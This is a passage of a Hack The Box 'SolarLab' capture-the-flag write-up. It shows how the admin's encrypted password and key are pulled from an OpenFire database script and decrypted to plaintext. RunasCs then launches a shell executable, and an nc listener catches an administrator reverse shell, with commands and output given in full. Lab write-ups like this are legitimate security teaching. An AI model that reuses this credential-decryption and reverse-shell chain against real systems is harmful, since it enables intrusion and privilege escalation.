<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> OFPROPERTY <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'provider.group.className'</span><span class="token punctuation">,</span><span class="token string">'org.jivesoftware.openfire.group.DefaultGroupProvider'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">)</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> OFPROPERTY <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'provider.lockout.className'</span><span class="token punctuation">,</span><span class="token string">'org.jivesoftware.openfire.lockout.DefaultLockOutProvider'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">)</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> OFPROPERTY <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'provider.securityAudit.className'</span><span class="token punctuation">,</span><span class="token string">'org.jivesoftware.openfire.security.DefaultSecurityAuditProvider'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">)</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> OFPROPERTY <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'provider.user.className'</span><span class="token punctuation">,</span><span class="token string">'org.jivesoftware.openfire.user.DefaultUserProvider'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">)</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> OFPROPERTY <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'provider.vcard.className'</span><span class="token punctuation">,</span><span class="token string">'org.jivesoftware.openfire.vcard.DefaultVCardProvider'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">)</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> OFPROPERTY <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'update.lastCheck'</span><span class="token punctuation">,</span><span class="token string">'1715023572956'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">)</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> OFPROPERTY <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'xmpp.auth.anonymous'</span><span class="token punctuation">,</span><span class="token string">'false'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">)</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> OFPROPERTY <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'xmpp.domain'</span><span class="token punctuation">,</span><span class="token string">'solarlab.htb'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">)</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> OFPROPERTY <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'xmpp.proxy.enabled'</span><span class="token punctuation">,</span><span class="token string">'false'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">)</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> OFPROPERTY <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'xmpp.socket.ssl.active'</span><span class="token punctuation">,</span><span class="token string">'true'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">)</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> OFVERSION <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'openfire'</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">)</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> OFSECURITYAUDITLOG <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'admin'</span><span class="token punctuation">,</span><span class="token number">1700223751042</span><span class="token punctuation">,</span><span class="token string">'Successful admin console login attempt'</span><span class="token punctuation">,</span><span class="token string">'solarlab.htb'</span><span class="token punctuation">,</span><span class="token string">'The user logged in successfully to the admin console from address 127.0.0.1. '</span><span class="token punctuation">)</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> OFSECURITYAUDITLOG <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'admin'</span><span class="token punctuation">,</span><span class="token number">1700223756534</span><span class="token punctuation">,</span><span class="token string">'edited file transfer proxy settings'</span><span class="token punctuation">,</span><span class="token string">'solarlab.htb'</span><span class="token punctuation">,</span><span class="token string">'port = 7777\u000ahardcodedAddress = null\u000aenabled = false'</span><span class="token punctuation">)</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> OFMUCSERVICE <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'conference'</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> OFPUBSUBNODE <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'pubsub'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'001700223743445'</span><span class="token punctuation">,</span><span class="token string">'001700223743445'</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'publishers'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'open'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">'solarlab.htb'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">'English'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token string">'all'</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> OFPUBSUBAFFILIATION <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'pubsub'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">'solarlab.htb'</span><span class="token punctuation">,</span><span class="token string">'owner'</span><span class="token punctuation">)</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> OFPUBSUBDEFAULTCONF <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'pubsub'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'publishers'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'open'</span><span class="token punctuation">,</span><span class="token string">'English'</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token string">'all'</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> OFPUBSUBDEFAULTCONF <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'pubsub'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10485760</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'publishers'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'open'</span><span class="token punctuation">,</span><span class="token string">'English'</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token string">'all'</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span></span></span></span></code></pre><div id="https://www.notion.so/1700b98a88f78049b48bc5090607e684" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f7803493e1fa1a74c74ffd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Seems like this is the SQL script that’s used for initializing the database for OpenFire. It starts with setting some constants and creating the tables, including </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">OFUSERS</code></span><span class="SemanticString">, which stores user credentials. The most interesting column is undoubtedly </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">PLAINPASSWORD</code></span><span class="SemanticString"> (column 6), which we could directly reuse for lateral movement/privilege escalation if found. It also contains the salt and several keys, which could still be useful if only the encrypted password is available.</span></span></p></div><pre id="https://www.notion.so/1700b98a88f78050bc42f4e39867ef58" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token keyword">CREATE</span> MEMORY <span class="token keyword">TABLE</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFUSER<span class="token punctuation">(</span>USERNAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>STOREDKEY <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span>SERVERKEY <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span>SALT <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ITERATIONS <span class="token keyword">INTEGER</span><span class="token punctuation">,</span>PLAINPASSWORD <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ENCRYPTEDPASSWORD <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">,</span>NAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span>EMAIL <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span>CREATIONDATE <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>MODIFICATIONDATE <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token keyword">CONSTRAINT</span> OFUSER_PK <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">(</span>USERNAME<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span></span></code></pre><div id="https://www.notion.so/1700b98a88f780279c12eaa2d80f157a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f780d48799ebc0f9692672" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Later in the script it inserts the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">admin</code></span><span class="SemanticString"> user credentials into </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">OFUSERS</code></span><span class="SemanticString">. Unfortunately the value of </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">PLAINPASSWORD</code></span><span class="SemanticString"> was set to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">NULL</code></span><span class="SemanticString">, but we still get the encrypted version and the salt.</span></span></p></div><pre id="https://www.notion.so/1700b98a88f7801b9b71ea57dc169d0c" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> OFUSER <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span><span class="token string">'gjMoswpK+HakPdvLIvp6eLKlYh0='</span><span class="token punctuation">,</span><span class="token string">'9MwNQcJ9bF4YeyZDdns5gvXp620='</span><span class="token punctuation">,</span><span class="token string">'yidQk5Skw11QJWTBAloAb28lYHftqa0x'</span><span class="token punctuation">,</span><span class="token number">4096</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token string">'becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442'</span><span class="token punctuation">,</span><span class="token string">'Administrator'</span><span class="token punctuation">,</span><span class="token string">'admin@solarlab.htb'</span><span class="token punctuation">,</span><span class="token string">'001700223740785'</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">)</span></span></span></span></code></pre><div id="https://www.notion.so/1700b98a88f7802ca5dbd9a53a778baa" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f780e7a2e6c5fcaf9f7732" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Also interestingly, it sets the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">passwordKey</code></span><span class="SemanticString"> property several lines down in the script. I’ll note down the value.</span></span></p></div><pre id="https://www.notion.so/1700b98a88f780f9834cc839086eab1b" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> OFPROPERTY <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'passwordKey'</span><span class="token punctuation">,</span><span class="token string">'hGXiFzsKaAeYLjn'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">)</span></span></span></span></code></pre><div id="https://www.notion.so/1700b98a88f78070aa33fcb4b26f7d06" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f780e4b7cbd6d8c4801f6c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With all the information gathered, what’s left to do is to decrypt the admin password.</span></span></p></div><div id="https://www.notion.so/1700b98a88f7807799a3e89d1883825f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f7808db75ffcf18ce8f9ee" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">OpenFire Admin Hash Decryption:</strong></span></span></p></div><div id="https://www.notion.so/1700b98a88f7802fa593eb5eb337c137" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Several OpenFire decrypt tools could be found in public, including </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/c0rdis/openfire_decrypt">this one</a></span><span class="SemanticString"> in Java. All it required was the encrypted password and the password key:</span></span></p></div><pre id="https://www.notion.so/1700b98a88f7804fbd90f4d51a079da4" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/solarlab]
└─$</span></mark></span><span class="SemanticString"><span> javac OpenFireDecryptPass.java

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/solarlab]
└─$</span></mark></span><span class="SemanticString"><span> java OpenFireDecryptPass becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442 hGXiFzsKaAeYLjn             

ThisPasswordShouldDo!@ (hex: 005400680069007300500061007300730077006F0072006400530068006F0075006C00640044006F00210040)</span></span></span></code></pre><div id="https://www.notion.so/1700b98a88f780f88760f6ba76409411" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f780b2a6a2cd0d7f140947" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’m guessing this is also the server’s admin password. I’ll use </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/antonioCoco/RunasCs">RunasCs</a></span><span class="SemanticString"> to send back a shell.</span></span></p></div><pre id="https://www.notion.so/1700b98a88f780e99780ec0ce9144e6a" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>c:\Users\openfire\Desktop&gt;</span></mark></span><span class="SemanticString"><span> .\RunasCs.exe administrator ThisPasswordShouldDo!@ &quot;C:\users\blake\desktop\shell.exe&quot; -t 0

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-26dbd$\Default
[+] Async process &#x27;C:\users\blake\desktop\shell.exe&#x27; with pid 4144 created in background.</span></span></span></code></pre><div id="https://www.notion.so/1700b98a88f7800994b0d6e8741b0acf" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f7800797b3ef6f5df897f0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">On my listener, an admin shell was captured. Box done!</span></span></p></div><pre id="https://www.notion.so/1700b98a88f7801a9419f7f9bbe703fb" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/solarlab]
└─$</span></mark></span><span class="SemanticString"><span> rlwrap nc -lvnp 8001

listening on [any] 8001 ...
connect to [10.10.14.74] from (UNKNOWN) [10.129.213.44] 62583
Microsoft Windows [Version 10.0.19045.4355]
(c) Microsoft Corporation. All rights reserved.

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\Windows\system32&gt;</span></mark></span><span class="SemanticString"><span> whoami

solarlab\administrator</span></span></span></code></pre><div id="https://www.notion.so/1700b98a88f780498d2ddc10543ca70d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f7800bbc56fa2883ee13b7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Root Flag:</strong></span></span></p></div><pre id="https://www.notion.so/1700b98a88f780dc9dadd598586da86e" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>c:\Users\Administrator\Desktop&gt;</span></mark></span><span class="SemanticString"><span> type root.txt

b9810d64************************</span></span></span></code></pre><div id="https://www.notion.so/1700b98a88f780178285e58240b8c27a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f780279f98f3856206668c" class="Divider"></div></article>
  <footer class="Footer">
  <div>&copy; C:\Users\ch3ng &gt;_ 2025</div>
  <div>&centerdot;</div>
  <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank"
      rel="noopener noreferrer">Notablog</a>.
  </div>
</footer>

</body>

</html>
